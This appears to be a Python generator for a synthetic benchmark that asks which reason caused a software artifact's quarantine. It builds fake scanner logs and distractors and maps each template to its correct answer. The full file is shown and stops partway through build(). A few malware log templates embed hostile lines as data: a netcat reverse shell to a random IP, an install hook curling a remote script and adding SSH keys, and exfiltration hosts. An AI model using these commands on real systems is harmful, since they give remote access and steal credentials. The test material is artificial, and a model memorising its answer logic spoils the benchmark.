"""Task: quarantine — WHY was this artifact quarantined?  (choice over reason enum)

Fully synthetic, modelled on real tool output formats (ClamAV, YARA, Trivy, Grype, OSV,
ScanCode, OPA/Rego, cosign, a Damerau-Levenshtein typosquat stage, human hold notes).
Ground truth is the template the decisive event came from. ~20% of items are HARD: a
second, non-triggering piece of evidence (a suspicion, a below-threshold finding, an
informational note) is present and the rubric rule must be applied to pick the primary reason.
"""
import hashlib
import random
from datetime import datetime, timedelta

from . import Item, write_items

NAME = "quarantine"

# Assumed enum; replace with the real one from 178_artifact_quarantine_reason.sql if it differs.
REASONS = {
    "malware_detected": "a scanner or advisory CONFIRMED malicious code in the artifact (AV signature, YARA rule, OSV MAL advisory, EDR alert)",
    "critical_vulnerability": "a CRITICAL-severity known vulnerability (CVSS >= 9.0 / severity CRITICAL) in the artifact or its bundled dependencies triggered the block",
    "license_violation": "a license scanner found a license that is disallowed or unknown under the license allowlist",
    "policy_violation": "an organisational policy rule denied the artifact (size, provenance/signature policy, missing SBOM, publisher allowlist, retention, severity threshold below CRITICAL)",
    "integrity_failure": "the artifact's bytes do not match what was declared: digest mismatch, failed signature verification, tampered or truncated content",
    "typosquat_suspected": "the lexical typosquat stage flagged the name as suspiciously similar to a popular package; suspicion only, no confirmed malicious content",
    "manual_hold": "a human placed the hold: security review, legal hold, customer escalation, ticket reference; no automated detection was the trigger",
}

QKEY = "reason"
QUESTION = {
    QKEY: {
        "type": "choice",
        "instructions": (
            "An artifact was moved to quarantine. From the attached events, choose the reason that DIRECTLY "
            "triggered the quarantine. Rules: a confirmed detection outranks a suspicion; a suspicion or an "
            "informational note that says it did not act is never the trigger; a finding blocked only because a "
            "policy threshold was crossed (e.g. HIGH severity denied by a policy rule) is a policy_violation, not a "
            "critical_vulnerability; a ticket or note that merely tracks an automated finding does not make it a manual_hold."
        ),
        "criteria": REASONS,
    }
}

PACKAGES = {
    "npm": ["lodash", "express", "react", "chalk", "minimist", "axios", "moment", "debug", "commander", "uuid",
            "yargs", "webpack", "typescript", "eslint", "prettier", "jest", "vue", "next", "socket.io", "mongoose"],
    "pypi": ["requests", "numpy", "pandas", "flask", "django", "boto3", "pyyaml", "cryptography", "urllib3", "pillow",
             "sqlalchemy", "celery", "pytest", "fastapi", "pydantic", "scipy", "matplotlib", "jinja2", "click", "rich"],
    "oci": ["library/nginx", "library/redis", "library/postgres", "library/python", "library/node", "bitnami/kafka",
            "grafana/grafana", "prom/prometheus", "hashicorp/vault", "library/alpine"],
    "maven": ["org.apache.commons:commons-lang3", "com.fasterxml.jackson.core:jackson-databind", "org.apache.logging.log4j:log4j-core",
              "com.google.guava:guava", "org.springframework:spring-core", "io.netty:netty-all", "org.yaml:snakeyaml",
              "org.apache.httpcomponents:httpclient", "ch.qos.logback:logback-classic", "com.squareup.okhttp3:okhttp"],
    "generic": ["terraform-provider-aws", "kubectl", "helm", "node-exporter", "vault-agent", "cloud-sql-proxy",
                "otel-collector", "buildkit", "argocd-cli", "trivy-db"],
}
POPULAR_TARGETS = ["lodash", "express", "react", "requests", "numpy", "pandas", "flask", "axios", "chalk", "urllib3", "boto3", "django"]
LICENSES_BAD = ["AGPL-3.0-only", "SSPL-1.0", "BUSL-1.1", "CC-BY-NC-4.0", "Elastic-2.0", "LicenseRef-scancode-proprietary-license", "LicenseRef-unknown"]
TICKETS = ["SEC", "LEGAL", "SUP", "INC", "COMP"]
NOISE = [
    "{ts} INFO  mirror sync ok  upstream=registry-1.docker.io lag=2s",
    "{ts} INFO  cache warm  key={name}@{version} hit_ratio=0.93",
    "{ts} INFO  sbom generated  format=cyclonedx-1.5 components={n}",
    "{ts} INFO  metadata refreshed  source=upstream etag=\"{etag}\"",
    "{ts} INFO  replication complete  region=eu-west-1 bytes={size}",
    "{ts} INFO  index updated  shard=3 docs={n}",
    "{ts} DEBUG gc: 0 unreferenced blobs",
    "{ts} INFO  download served  client=ci-runner-{n} bytes={size}",
    "{ts} INFO  scan scheduled  scanner=trivy queue_depth={n}",
    "{ts} INFO  signature cache refreshed  entries={n}",
]


def _sha(r):
    return hashlib.sha256(str(r.random()).encode()).hexdigest()


def _cve(r):
    return f"CVE-{r.randint(2019, 2026)}-{r.randint(1000, 49999)}"


def _ts(r, base):
    return (base + timedelta(seconds=r.randint(0, 3600))).strftime("%Y-%m-%dT%H:%M:%SZ")


def _version(r, typ):
    if typ == "oci":
        return r.choice([f"{r.randint(1, 16)}.{r.randint(0, 20)}", f"{r.randint(1, 16)}.{r.randint(0, 20)}-alpine", "latest", f"sha256-{_sha(r)[:12]}"])
    return f"{r.randint(0, 12)}.{r.randint(0, 30)}.{r.randint(0, 40)}"


def _artifact(r):
    typ = r.choice(list(PACKAGES))
    name = r.choice(PACKAGES[typ])
    size = r.choice([r.randint(20_000, 2_000_000), r.randint(2_000_000, 80_000_000), r.randint(80_000_000, 400_000_000)])
    return {"name": name, "version": _version(r, typ), "type": typ, "sha256": _sha(r), "size_bytes": size}


def _squat_name(r, target):
    ops = [
        lambda s: s[:-1] if len(s) > 4 else s + "s",                       # drop last char
        lambda s: s[0] + s[2] + s[1] + s[3:] if len(s) > 3 else s,        # transpose
        lambda s: s.replace("l", "1", 1) if "l" in s else s.replace("o", "0", 1),
        lambda s: s + "-js",
        lambda s: "py" + s,
        lambda s: s.replace("s", "z", 1) if "s" in s else s + "z",
        lambda s: s.replace("a", "а", 1) if "a" in s else s.replace("e", "е", 1),  # cyrillic homoglyph
    ]
    return r.choice(ops)(target)


# ---------------------------------------------------------------- decisive event templates
# Each template: fn(r, a, ts) -> (event_string, scanner_summary)

def _t_malware(r, a, ts):
    sig = r.choice(["Win.Trojan.Agent", "Unix.Malware.Agent", "Js.Trojan.Shellcode", "Multios.Coinminer.Miner", "Py.Trojan.Stealer", "Unix.Dropper.Mirai"])
    fam = r.choice(["Sandworm", "Lazarus_Loader", "NPM_Stealer", "PyPI_Dropper", "Generic_Reverse_Shell", "XMRig_Miner"])
    mal = f"MAL-{r.randint(2023, 2026)}-{r.randint(100, 9999)}"
    return r.choice([
        lambda: (f"{ts} clamav: /blobs/{a['sha256'][:12]}/package/lib/index.js: {sig}-{r.randint(100000, 9999999)}-{r.randint(0, 9)} FOUND  -> action=QUARANTINE",
                 f"clamav 1.4: 1 infected file ({sig})"),
        lambda: (f"{ts} yara: rule {fam} matched  file=setup.py  strings=[$b64_exec, $socket_connect]  severity=critical  -> action=QUARANTINE",
                 f"yara: 1 rule hit ({fam})"),
        lambda: (f"{ts} osv: {a['name']}@{a['version']} matches advisory {mal} (malicious package: credential exfiltration via postinstall)  -> action=QUARANTINE",
                 f"osv: malicious-package advisory {mal}"),
        lambda: (f"{ts} trivy: class=secret+malware  target={a['name']}  finding=\"obfuscated payload decoded to reverse shell (nc -e /bin/sh 45.{r.randint(1, 254)}.{r.randint(1, 254)}.{r.randint(1, 254)} 4444)\"  severity=CRITICAL  -> action=QUARANTINE",
                 "trivy: malware finding (reverse shell)"),
        lambda: (f"{ts} edr: {{\"alert\":\"Malicious file detected\",\"family\":\"{fam}\",\"path\":\"/tmp/extract/{a['name']}/postinstall.js\",\"verdict\":\"malicious\",\"score\":{r.randint(90, 100)}}}  -> action=QUARANTINE",
                 f"edr: verdict=malicious ({fam})"),
        lambda: (f"{ts} clamav: /blobs/{a['sha256'][:12]}/wheel/{a['name'].replace('-', '_')}/__init__.py: {sig}-{r.randint(100000, 9999999)}-{r.randint(0, 9)} FOUND  -> action=QUARANTINE",
                 f"clamav 1.4: 1 infected file ({sig})"),
        lambda: (f"{ts} yara: rule {fam} matched  file=layer/{a['sha256'][:8]}/usr/bin/kworkerd  strings=[$xmrig_banner, $stratum_url]  -> action=QUARANTINE",
                 f"yara: cryptominer signature ({fam})"),
        lambda: (f"{ts} osv: {a['name']}@{a['version']} listed in {mal}: \"package steals npm tokens and .env files, exfil to hxxp://api-metrics[.]xyz\"  -> action=QUARANTINE",
                 f"osv: {mal} malicious"),
        lambda: (f"{ts} sandbox: dynamic analysis of install hook: spawned curl to 185.{r.randint(1, 254)}.{r.randint(1, 254)}.{r.randint(1, 254)}/i.sh, wrote ~/.ssh/authorized_keys  verdict=MALICIOUS  -> action=QUARANTINE",
                 "sandbox: malicious install-time behaviour"),
        lambda: (f"{ts} trivy: malware  target={a['name']}:{a['version']}  rule=\"known-malicious-hash\"  sha256={a['sha256'][:16]}... matches blocklist entry {mal}  -> action=QUARANTINE",
                 "trivy: known-malicious hash"),
        lambda: (f"{ts} edr: {{\"alert\":\"Webshell detected\",\"family\":\"China_Chopper\",\"path\":\"/layer/var/www/html/.x.php\",\"verdict\":\"malicious\"}}  -> action=QUARANTINE",
                 "edr: webshell in image layer"),
        lambda: (f"{ts} yara: rule {fam} matched  file=jar/META-INF/classes/Loader.class  strings=[$runtime_exec, $base64_url]  -> action=QUARANTINE",
                 f"yara: {fam} in jar"),
        lambda: (f"{ts} clamav: {a['name']}-{a['version']}.tgz: Js.Trojan.Agent-{r.randint(100000, 9999999)}-{r.randint(0, 9)} FOUND  -> action=QUARANTINE",
                 "clamav: infected tarball"),
        lambda: (f"{ts} osv: match {mal} for {a['name']} versions <= {a['version']}: typosquat WITH confirmed credential-stealing payload (analysis attached)  -> action=QUARANTINE",
                 f"osv: {mal} confirmed malicious payload"),
        lambda: (f"{ts} edr: {{\"alert\":\"Infostealer\",\"family\":\"{fam}\",\"iocs\":[\"discord.com/api/webhooks/{r.randint(10**17, 10**18)}\"],\"verdict\":\"malicious\"}}  -> action=QUARANTINE",
                 f"edr: infostealer ({fam})"),
    ])()


def _t_critvuln(r, a, ts):
    cve = _cve(r)
    score = round(r.uniform(9.0, 10.0), 1)
    fixed = f"{a['version'].split('.')[0]}.{r.randint(0, 30)}.{r.randint(0, 40)}" if a["type"] != "oci" else "latest"
    dep = r.choice(["openssl", "glibc", "zlib", "libxml2", "curl", "log4j-core", "jackson-databind", "minimist", "ansi-regex", "setuptools"])
    return r.choice([
        lambda: (f"{ts} trivy: {{\"VulnerabilityID\":\"{cve}\",\"PkgName\":\"{a['name']}\",\"InstalledVersion\":\"{a['version']}\",\"FixedVersion\":\"{fixed}\",\"Severity\":\"CRITICAL\",\"CVSS\":{{\"nvd\":{{\"V3Score\":{score}}}}}}}  -> action=QUARANTINE",
                 f"trivy: 1 CRITICAL ({cve}, CVSS {score})"),
        lambda: (f"{ts} grype: {dep} {a['version']}  {fixed}  {cve}  Critical  (cvss {score})  -> action=QUARANTINE",
                 f"grype: CRITICAL {cve} in {dep}"),
        lambda: (f"{ts} trivy: Total: 14 (LOW: 6, MEDIUM: 5, HIGH: 2, CRITICAL: 1)  CRITICAL={cve} pkg={dep} cvss={score} fixed={fixed}  -> action=QUARANTINE",
                 f"trivy: CRITICAL {cve}"),
        lambda: (f"{ts} osv: {a['name']}@{a['version']} affected by GHSA-{r.choice('abcdefghjkmnpqrstvwxyz')}{r.randint(100, 999)}-{r.randint(1000, 9999)} ({cve}) severity=CRITICAL cvss={score}: remote code execution via deserialization  -> action=QUARANTINE",
                 f"osv: CRITICAL {cve} RCE"),
        lambda: (f"{ts} grype: {{\"vulnerability\":{{\"id\":\"{cve}\",\"severity\":\"Critical\",\"cvss\":[{{\"metrics\":{{\"baseScore\":{score}}}}}],\"fix\":{{\"versions\":[\"{fixed}\"],\"state\":\"fixed\"}}}},\"artifact\":{{\"name\":\"{dep}\"}}}}  -> action=QUARANTINE",
                 f"grype: Critical {cve}"),
        lambda: (f"{ts} trivy: image {a['name']}:{a['version']}  os=debian 12  {cve} (CRITICAL, cvss {score}) in {dep}: buffer overflow, fixed in {dep}-{fixed}  -> action=QUARANTINE",
                 f"trivy: CRITICAL {cve} in base image"),
        lambda: (f"{ts} vuln-gate: severity=CRITICAL count=1 ids=[{cve}] epss={round(r.uniform(0.5, 0.97), 2)} kev=true  -> action=QUARANTINE",
                 f"vuln-gate: CRITICAL {cve} (KEV)"),
        lambda: (f"{ts} grype: {a['name']} {a['version']}  (no fix)  {cve}  Critical  cvss {score}  vector AV:N/AC:L/PR:N/UI:N/S:C  -> action=QUARANTINE",
                 f"grype: Critical {cve} unfixed"),
        lambda: (f"{ts} trivy: {{\"Target\":\"{a['name']}\",\"Vulnerabilities\":[{{\"VulnerabilityID\":\"{cve}\",\"Severity\":\"CRITICAL\",\"Title\":\"Log4Shell-class JNDI lookup RCE\",\"CVSS\":{{\"nvd\":{{\"V3Score\":10.0}}}}}}]}}  -> action=QUARANTINE",
                 f"trivy: CRITICAL {cve} (10.0)"),
        lambda: (f"{ts} osv: advisory {cve} CRITICAL ({score}) matches {dep} bundled in {a['name']}@{a['version']}; fix available {fixed}  -> action=QUARANTINE",
                 f"osv: CRITICAL {cve} bundled dep"),
        lambda: (f"{ts} grype: 2 Critical, 5 High, 12 Medium  first Critical: {cve} in {dep} (cvss {score}) fixed-in {fixed}  -> action=QUARANTINE",
                 f"grype: 2 Critical incl. {cve}"),
        lambda: (f"{ts} trivy: {cve}  CRITICAL  {dep}  {a['version']} -> {fixed}  \"SQL injection in query builder allows unauthenticated RCE\"  -> action=QUARANTINE",
                 f"trivy: CRITICAL {cve}"),
        lambda: (f"{ts} vuln-gate: {a['name']}@{a['version']}: CRITICAL {cve} cvss {score} exploited-in-the-wild=yes  -> action=QUARANTINE",
                 f"vuln-gate: CRITICAL {cve} ITW"),
        lambda: (f"{ts} grype: {{\"id\":\"{cve}\",\"severity\":\"Critical\",\"description\":\"Authentication bypass in {dep}\",\"fix\":\"{fixed}\"}}  -> action=QUARANTINE",
                 f"grype: Critical {cve} auth bypass"),
        lambda: (f"{ts} trivy: layer sha256:{_sha(r)[:12]}  {cve}  CRITICAL  cvss={score}  pkg={dep}  -> action=QUARANTINE",
                 f"trivy: CRITICAL {cve} in layer"),
    ])()


def _t_license(r, a, ts):
    lic = r.choice(LICENSES_BAD)
    return r.choice([
        lambda: (f"{ts} scancode: detected_license_expression={lic}  match_coverage=100  file=LICENSE  policy=allowlist(MIT,Apache-2.0,BSD-*,ISC)  -> DENIED  action=QUARANTINE",
                 f"scancode: {lic} not in allowlist"),
        lambda: (f"{ts} fossa: {{\"issue\":\"policy_flag\",\"license\":\"{lic}\",\"dependency\":\"{a['name']}@{a['version']}\",\"rule\":\"deny copyleft/source-available\"}}  -> action=QUARANTINE",
                 f"fossa: {lic} flagged"),
        lambda: (f"{ts} ort: RuleViolation  severity=ERROR  rule=DISALLOWED_LICENSE  license={lic}  pkg={a['name']}  -> action=QUARANTINE",
                 f"ort: disallowed license {lic}"),
        lambda: (f"{ts} license-gate: package.json \"license\": \"{lic}\"  allowlist miss  -> action=QUARANTINE",
                 f"license-gate: {lic}"),
        lambda: (f"{ts} scancode: LICENSE text unmatched (score 0.31 vs nearest MIT); classified LicenseRef-unknown; unknown licenses are denied by policy  -> action=QUARANTINE",
                 "scancode: unknown license"),
        lambda: (f"{ts} fossa: transitive dependency {r.choice(['readline', 'mysql-connector', 'itext', 'ghostscript'])} licensed {lic} via {a['name']}@{a['version']}; policy deny  -> action=QUARANTINE",
                 f"fossa: transitive {lic}"),
        lambda: (f"{ts} ort: evaluator: {a['name']} declared_licenses=[{lic}] concluded={lic}  violates policy 'permissive-only'  -> action=QUARANTINE",
                 f"ort: {lic} violates permissive-only"),
        lambda: (f"{ts} license-gate: pyproject classifier \"License :: Other/Proprietary License\"  -> DENIED  action=QUARANTINE",
                 "license-gate: proprietary classifier"),
        lambda: (f"{ts} scancode: dual license MIT OR {lic} with mandatory {lic} for server use (per LICENSE.md §3); policy deny  -> action=QUARANTINE",
                 f"scancode: {lic} clause"),
        lambda: (f"{ts} fossa: image layer contains /usr/share/doc/{r.choice(['mongodb', 'redis-stack', 'elasticsearch'])}/LICENSE = {lic}  -> action=QUARANTINE",
                 f"fossa: {lic} in image"),
        lambda: (f"{ts} ort: NOTICE file references \"{lic}\" for bundled component; allowlist miss  -> action=QUARANTINE",
                 f"ort: bundled {lic}"),
        lambda: (f"{ts} license-gate: LICENSE missing from artifact; policy requires an allowlisted license  -> action=QUARANTINE",
                 "license-gate: no license"),
        lambda: (f"{ts} scancode: license_expression=\"{lic}\" in pom.xml <licenses> block; denied  -> action=QUARANTINE",
                 f"scancode: {lic} in pom"),
        lambda: (f"{ts} fossa: \"Commons Clause\" rider detected on Apache-2.0; treated as source-available; deny  -> action=QUARANTINE",
                 "fossa: Commons Clause"),
        lambda: (f"{ts} ort: license {lic} requires network-copyleft disclosure; org policy forbids; pkg={a['name']}@{a['version']}  -> action=QUARANTINE",
                 f"ort: {lic} network copyleft"),
    ])()


def _t_policy(r, a, ts):
    mb = a["size_bytes"] // 1_000_000
    pub = r.choice(["npm-user-83421", "pypi-anon-7", "dockerhub-unverified", "gh-actions-bot-x", "unknown-publisher"])
    hi_cve = _cve(r)
    hi = round(r.uniform(7.0, 8.9), 1)
    return r.choice([
        lambda: (f"{ts} opa: deny[msg] {{ msg := \"artifact size {mb}MB exceeds policy max 500MB\" }}  -> action=QUARANTINE",
                 "opa: size limit"),
        lambda: (f"{ts} opa: deny: provenance attestation missing (SLSA level 0 < required level 2)  -> action=QUARANTINE",
                 "opa: missing provenance"),
        lambda: (f"{ts} opa: deny: no SBOM attached to {a['name']}@{a['version']} (policy sbom.required=true)  -> action=QUARANTINE",
                 "opa: missing SBOM"),
        lambda: (f"{ts} opa: deny: publisher '{pub}' not in allowlist for namespace prod  -> action=QUARANTINE",
                 "opa: publisher allowlist"),
        lambda: (f"{ts} policy: retention rule R-12: pre-release tags older than 90 days are blocked from promotion  -> action=QUARANTINE",
                 "policy: retention"),
        lambda: (f"{ts} opa: deny: image runs as root (USER not set) violates policy container.nonroot  -> action=QUARANTINE",
                 "opa: runs as root"),
        # the HIGH-below-CRITICAL threshold case: trigger is the policy rule, not a critical vuln
        lambda: (f"{ts} trivy: {hi_cve} HIGH cvss={hi} pkg={a['name']} ; opa: deny: vuln.max_severity HIGH exceeds policy threshold MEDIUM for namespace prod  -> action=QUARANTINE",
                 f"opa: severity policy (HIGH {hi_cve} > MEDIUM allowed)"),
        lambda: (f"{ts} opa: deny: unsigned artifact; policy signature.required=true (no cosign signature found, not a verification failure)  -> action=QUARANTINE",
                 "opa: unsigned"),
        lambda: (f"{ts} policy: tag 'latest' is forbidden for promotion to prod (immutable tags policy)  -> action=QUARANTINE",
                 "policy: mutable tag"),
        lambda: (f"{ts} opa: deny: package has install scripts (postinstall) and namespace policy scripts.allowed=false  -> action=QUARANTINE",
                 "opa: install scripts disallowed"),
        lambda: (f"{ts} opa: deny: license metadata field empty; policy requires declared license (scanner not run)  -> action=QUARANTINE",
                 "opa: undeclared license metadata"),
        lambda: (f"{ts} policy: export-control: artifact contains crypto module without ECCN classification  -> action=QUARANTINE",
                 "policy: export control"),
        lambda: (f"{ts} opa: deny: base image {r.choice(['ubuntu:18.04', 'debian:9', 'centos:7'])} is end-of-life; policy base.supported=true  -> action=QUARANTINE",
                 "opa: EOL base image"),
        lambda: (f"{ts} grype: 3 High (max cvss {hi}) 0 Critical ; policy: deny when high_count > 0 in namespace payments  -> action=QUARANTINE",
                 "policy: high-count threshold"),
        lambda: (f"{ts} opa: deny: artifact published from unapproved region/CI system (source=personal-laptop)  -> action=QUARANTINE",
                 "opa: unapproved build source"),
    ])()


def _t_integrity(r, a, ts):
    other = _sha(r)
    return r.choice([
        lambda: (f"{ts} verify: sha256 mismatch  manifest={a['sha256'][:20]}...  blob={other[:20]}...  -> action=QUARANTINE",
                 "verify: digest mismatch"),
        lambda: (f"{ts} cosign: verification failed: no matching signatures for {a['name']}:{a['version']} (signature present but invalid)  -> action=QUARANTINE",
                 "cosign: signature invalid"),
        lambda: (f"{ts} verify: layer sha256:{other[:12]} does not match descriptor digest sha256:{a['sha256'][:12]} (tampered layer)  -> action=QUARANTINE",
                 "verify: tampered layer"),
        lambda: (f"{ts} fetch: truncated download {a['name']}-{a['version']}: expected {a['size_bytes']} bytes got {a['size_bytes'] - r.randint(1000, 50000)}  -> action=QUARANTINE",
                 "fetch: truncated"),
        lambda: (f"{ts} sigstore: rekor inclusion proof invalid for entry {r.randint(10**8, 10**9)}  -> action=QUARANTINE",
                 "sigstore: bad inclusion proof"),
        lambda: (f"{ts} verify: gpg: BAD signature from \"release-bot <release@{a['name'].split('/')[-1].split(':')[0]}.org>\"  -> action=QUARANTINE",
                 "gpg: BAD signature"),
        lambda: (f"{ts} verify: package-lock integrity sha512-{other[:24]}... != tarball sha512  -> action=QUARANTINE",
                 "verify: lockfile integrity mismatch"),
        lambda: (f"{ts} verify: RECORD file lists 41 entries, wheel contains 43 (2 unlisted .so files)  -> action=QUARANTINE",
                 "verify: wheel RECORD mismatch"),
        lambda: (f"{ts} cosign: certificate identity mismatch: expected https://github.com/{a['name'].split('/')[-1]}/.github/workflows/release.yml got unknown  -> action=QUARANTINE",
                 "cosign: identity mismatch"),
        lambda: (f"{ts} verify: manifest sha256 {a['sha256'][:16]} differs from upstream registry {other[:16]} for same tag  -> action=QUARANTINE",
                 "verify: upstream digest drift"),
        lambda: (f"{ts} fetch: gzip: unexpected end of file at byte {r.randint(10**5, 10**7)}  -> action=QUARANTINE",
                 "fetch: corrupt archive"),
        lambda: (f"{ts} verify: jar signature verification failed: SHA-256 digest error for META-INF/classes/Main.class  -> action=QUARANTINE",
                 "verify: jar digest error"),
        lambda: (f"{ts} cosign: attestation payload digest does not match subject  -> action=QUARANTINE",
                 "cosign: attestation mismatch"),
        lambda: (f"{ts} verify: checksums.txt: {a['name']}_{a['version']}_linux_amd64.tar.gz: FAILED  -> action=QUARANTINE",
                 "verify: checksum FAILED"),
        lambda: (f"{ts} verify: content-length {a['size_bytes']} but manifest size {a['size_bytes'] + r.randint(100, 9000)}; blob rejected  -> action=QUARANTINE",
                 "verify: size mismatch"),
    ])()


def _t_typosquat(r, a, ts):
    target = r.choice(POPULAR_TARGETS)
    cand = _squat_name(r, target)
    return r.choice([
        lambda: (f"{ts} typosquat: '{cand}' vs popular '{target}': damerau_levenshtein=1  popularity_gate=pass (target weekly_dl={r.randint(10**6, 10**8)})  -> action=QUARANTINE (pending human review)",
                 f"typosquat: DL=1 to {target}"),
        lambda: (f"{ts} typosquat: confusable skeleton '{target}' == skeleton('{cand}') (UTS#39)  -> action=QUARANTINE (pending human review)",
                 f"typosquat: confusable skeleton match {target}"),
        lambda: (f"{ts} typosquat: affix match '{cand}' = '{target}' + suffix; publisher age 2d; downloads 17  -> action=QUARANTINE (pending human review)",
                 f"typosquat: affix on {target}"),
        lambda: (f"{ts} typosquat: '{cand}' transposition of '{target}' (score 0.94)  -> action=QUARANTINE (pending human review)",
                 f"typosquat: transposition of {target}"),
        lambda: (f"{ts} typosquat: homoglyph: '{cand}' contains non-ASCII letter mapping to '{target}'  -> action=QUARANTINE (pending human review)",
                 f"typosquat: homoglyph of {target}"),
        lambda: (f"{ts} typosquat: '{cand}' vs '{target}': keyboard-adjacent substitution (score 0.91); no malware scan findings  -> action=QUARANTINE (pending human review)",
                 f"typosquat: keyboard-adjacent to {target}"),
        lambda: (f"{ts} typosquat: scope squat: '@{target}-team/{target}' mimics unscoped '{target}'  -> action=QUARANTINE (pending human review)",
                 f"typosquat: scope squat on {target}"),
        lambda: (f"{ts} typosquat: '{cand}' damerau_levenshtein=1 to '{target}'; README similarity 0.88; publisher account age 4d  -> action=QUARANTINE (pending human review)",
                 f"typosquat: DL=1 + README copy of {target}"),
        lambda: (f"{ts} typosquat: '{cand}' matches '{target}' after separator normalisation ('-' vs '_')  -> action=QUARANTINE (pending human review)",
                 f"typosquat: separator variant of {target}"),
        lambda: (f"{ts} typosquat: '{cand}' vs '{target}': version-suffix squat ('{target}3')  -> action=QUARANTINE (pending human review)",
                 f"typosquat: version-suffix of {target}"),
        lambda: (f"{ts} typosquat: name '{cand}' is a 1-edit neighbour of top-100 package '{target}'; clamav clean; hold for reviewer  -> action=QUARANTINE (pending human review)",
                 f"typosquat: neighbour of {target}"),
        lambda: (f"{ts} typosquat: '{cand}' vs '{target}': pluralisation squat  -> action=QUARANTINE (pending human review)",
                 f"typosquat: plural of {target}"),
        lambda: (f"{ts} typosquat: candidate '{cand}' target '{target}' skeleton_match=true dl_distance=2 combined_score=0.87  -> action=QUARANTINE (pending human review)",
                 f"typosquat: combined score vs {target}"),
        lambda: (f"{ts} typosquat: '{cand}' vs '{target}': 'py'/'js' prefix squat, target weekly_dl={r.randint(10**6, 10**8)}  -> action=QUARANTINE (pending human review)",
                 f"typosquat: prefix squat on {target}"),
        lambda: (f"{ts} typosquat: '{cand}' vs '{target}': omitted-character squat; no scanner findings yet  -> action=QUARANTINE (pending human review)",
                 f"typosquat: omitted char vs {target}"),
    ])()


def _t_manual(r, a, ts):
    tk = f"{r.choice(TICKETS)}-{r.randint(100, 9999)}"
    who = r.choice(["@security", "@legal", "@platform-oncall", "@release-mgr", "@compliance", "@j.doe"])
    return r.choice([
        lambda: (f"{ts} hold: placed by {who}: \"pending security review, see {tk}\"  -> action=QUARANTINE (manual)",
                 f"manual hold by {who} ({tk})"),
        lambda: (f"{ts} hold: LEGAL HOLD {tk} — do not promote or delete until litigation hold lifted  -> action=QUARANTINE (manual)",
                 f"legal hold {tk}"),
        lambda: (f"{ts} hold: customer escalation {tk}: customer reports regression in {a['version']}; hold pending RCA  -> action=QUARANTINE (manual)",
                 f"customer escalation {tk}"),
        lambda: (f"{ts} hold: {who} via CLI: artifact-keeper quarantine {a['name']}@{a['version']} --reason \"manual: waiting on vendor statement\"  -> action=QUARANTINE (manual)",
                 f"manual CLI hold by {who}"),
        lambda: (f"{ts} hold: change freeze CAB-{r.randint(10, 99)}: all promotions paused by {who}  -> action=QUARANTINE (manual)",
                 "change freeze"),
        lambda: (f"{ts} hold: {who}: \"scans are clean but upstream maintainer account was reportedly compromised last week; hold until confirmed\" {tk}  -> action=QUARANTINE (manual)",
                 f"manual precautionary hold ({tk})"),
        lambda: (f"{ts} hold: audit sample: {who} pulled 1 in 200 artifacts for manual inspection  -> action=QUARANTINE (manual)",
                 "manual audit sample"),
        lambda: (f"{ts} hold: {who}: \"requested by product owner, not ready for GA\" {tk}  -> action=QUARANTINE (manual)",
                 f"manual hold, product ({tk})"),
        lambda: (f"{ts} hold: incident {tk}: {who} quarantined all artifacts published in the last 6h as a precaution  -> action=QUARANTINE (manual)",
                 f"incident precaution ({tk})"),
        lambda: (f"{ts} hold: {who}: \"duplicate of internal fork, waiting for dedupe decision\"  -> action=QUARANTINE (manual)",
                 "manual dedupe hold"),
        lambda: (f"{ts} hold: {who} approved exception request {tk} but placed hold until the exception is signed  -> action=QUARANTINE (manual)",
                 f"manual hold pending exception ({tk})"),
        lambda: (f"{ts} hold: {who}: \"vendor EOL notice received, evaluating replacement\" {tk}  -> action=QUARANTINE (manual)",
                 f"manual EOL evaluation ({tk})"),
        lambda: (f"{ts} hold: UI action by {who}: reason=\"other\" note=\"talk to me before releasing\"  -> action=QUARANTINE (manual)",
                 f"manual UI hold by {who}"),
        lambda: (f"{ts} hold: {who}: {tk} — pen-test finding pending triage, no scanner detection  -> action=QUARANTINE (manual)",
                 f"manual pen-test hold ({tk})"),
        lambda: (f"{ts} hold: {who}: \"contract with publisher expired {r.randint(1, 28)} days ago\" {tk}  -> action=QUARANTINE (manual)",
                 f"manual contract hold ({tk})"),
    ])()


TEMPLATES = {
    "malware_detected": _t_malware,
    "critical_vulnerability": _t_critvuln,
    "license_violation": _t_license,
    "policy_violation": _t_policy,
    "integrity_failure": _t_integrity,
    "typosquat_suspected": _t_typosquat,
    "manual_hold": _t_manual,
}

# ---------------------------------------------------------------- non-triggering distractor evidence
# Each returns an informational line that mentions another reason's domain but explicitly did NOT trigger.

def _d_typosquat(r, a, ts):
    t = r.choice(POPULAR_TARGETS)
    return f"{ts} typosquat: '{a['name']}' vs '{t}': damerau_levenshtein=3, below auto-block threshold; advisory only, no action"


def _d_critvuln(r, a, ts):
    return f"{ts} trivy: {_cve(r)} HIGH cvss={round(r.uniform(7.0, 8.9), 1)} pkg={a['name']} ; HIGH is below quarantine threshold CRITICAL; no action"


def _d_license(r, a, ts):
    return f"{ts} scancode: detected_license_expression={r.choice(['MIT', 'Apache-2.0', 'BSD-3-Clause'])}  allowlist=pass; note: 1 file with LicenseRef-unknown header (informational)"


def _d_policy(r, a, ts):
    return f"{ts} opa: warn (non-blocking): SBOM older than 30 days; policy sbom.max_age is advisory in this namespace; no action"


def _d_malware(r, a, ts):
    return f"{ts} clamav: scanned {r.randint(50, 900)} files, 0 infected  OK"


def _d_manual(r, a, ts):
    return f"{ts} note: ticket {r.choice(TICKETS)}-{r.randint(100, 9999)} opened automatically to track the automated finding above"


def _d_integrity(r, a, ts):
    return f"{ts} verify: sha256 OK  cosign: signature verified (keyless, issuer=https://token.actions.githubusercontent.com)"


DISTRACTORS = {
    "typosquat_suspected": _d_typosquat,
    "critical_vulnerability": _d_critvuln,
    "license_violation": _d_license,
    "policy_violation": _d_policy,
    "malware_detected": _d_malware,
    "manual_hold": _d_manual,
    "integrity_failure": _d_integrity,
}

# For each primary reason, which distractors are plausible and resolvable by the rubric rule.
HARD_PAIRS = {
    "malware_detected": ["typosquat_suspected", "manual_hold", "critical_vulnerability"],
    "critical_vulnerability": ["typosquat_suspected", "license_violation", "manual_hold"],
    "license_violation": ["critical_vulnerability", "policy_violation", "manual_hold"],
    "policy_violation": ["critical_vulnerability", "malware_detected", "license_violation"],
    "integrity_failure": ["manual_hold", "malware_detected", "typosquat_suspected"],
    "typosquat_suspected": ["malware_detected", "policy_violation", "integrity_failure"],
    "manual_hold": ["critical_vulnerability", "license_violation", "malware_detected"],
}


def build(n: int = 420, seed: int = 0) -> list[Item]:
    r = random.Random(seed)
    reasons = list(REASONS)
